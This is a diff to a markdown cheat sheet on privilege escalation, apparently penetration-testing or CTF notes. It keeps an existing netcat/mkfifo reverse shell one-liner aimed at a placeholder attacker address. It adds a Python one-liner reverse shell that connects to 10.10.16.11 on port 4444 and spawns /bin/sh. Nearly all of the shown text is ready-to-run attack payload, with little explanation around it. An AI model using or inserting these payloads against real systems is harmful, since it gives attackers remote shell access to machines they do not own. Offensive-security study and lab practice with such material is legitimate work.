@@ -16,7 +16,14 @@ There are two common types of privilege escalation: vertical and horizontal. Ver
 ## Most Reliable Reverse Shell Payload  
 	```console
 	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER'S IP ADDRESS] [PORT OF THE ATTACKER'S CHOOSING] >/tmp/f
-	```
+	```  
+
+
+* Python Rev Shell  
+
+```console
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.11",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+```
 
 
 
